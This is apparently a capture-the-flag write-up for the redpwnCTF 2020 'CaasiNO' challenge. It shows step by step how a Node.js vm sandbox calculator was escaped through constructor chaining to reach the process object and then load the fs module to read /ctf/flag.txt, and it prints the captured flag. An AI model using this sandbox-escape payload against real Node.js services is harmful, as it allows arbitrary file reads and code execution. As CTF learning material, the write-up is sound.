# CaasiNO
**Category:** Misc

**Points:** 402

**Description:**
> Who needs regex for sanitization when we have VMs?!?!
>
> The flag is at /ctf/flag.txt0
>
> `nc 2020.redpwnc.tf 31273`
>
> **Author:** asphyxia
>
> **Given:** calculator.js

## Writeup
This one isn't as easy for me to explain because I don't understand FULLY how
I am able to get this flag. From my understanding, we are in a JavaScript VM,
which allows us to run some simple JavaScript. I don't know all that much JavaScript,
but I was able to do some research to find out that this vm is escapable.

I started out by seeing:
```
> this.constructor.constructor()
function anonymous(
) {

}
```

This gave me a little inspiration to try to find the flag. I messed around with
this for a while to try to get further and further. I then was able to return this
"process" object, which I was sure had many resources. I was right.
```
> this.constructor.constructor("return this")().process
[object process]
```

I fumbled around with more code and functions until I came across this beauty:
```
> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("fs").readFileSync("ctf/flag.txt")
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```

## Flag
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}

## Resources
[readFileSync](https://www.geeksforgeeks.org/node-js-fs-readfilesync-method/?ref=leftbar-rightbar)

[Main idea](https://github.com/gf3/sandbox/issues/50)
